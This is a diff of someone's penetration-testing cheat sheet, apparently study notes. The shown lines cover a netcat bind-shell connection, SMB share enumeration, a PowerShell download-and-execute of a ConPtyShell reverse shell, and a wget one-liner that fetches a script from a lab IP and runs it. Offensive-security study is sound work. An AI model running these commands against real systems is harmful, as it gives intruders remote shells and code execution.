@@ -69,6 +69,8 @@
 
 # Netcat 
 1. Sometimes have firewall, not all service can nc (e.g. available services already using ,50000 <- want fuck this? 18000 service also on. we can impersonate this port)
+## Connect a bind shell
+- ``` nc -nv {ip} {port} ```
 
 # IMAP 
 - GUI : Thunderbird , account name: ``` {username}@localhost ```, host = ip 
@@ -173,8 +175,9 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
    ```
 
 # SMB 
-1. List shares: ``` smbclient -L \\{IP}\ -N ```
-2. Connect to share ``` smbclient \\\\{IP}\\{share} -U '{domain}\{username}%{password}' ```
+1. first enum ``` smbclient -L //{ip} --option="client min protocol=core" -U '' ```
+2. List shares: ``` smbclient -L \\{IP}\ -N ```
+3. Connect to share ``` smbclient \\\\{IP}\\{share} -U '{domain}\{username}%{password}' ```
 
 ## setuserinfo
 - modify user ac info
@@ -199,4 +202,3 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 - wget
 ### Oneliner 
 - ``` wget 192.168.45.176/bash.sh -O /tmp/bash.sh && chmod +x /tmp/bash.sh && /tmp/bash.sh  ```
-
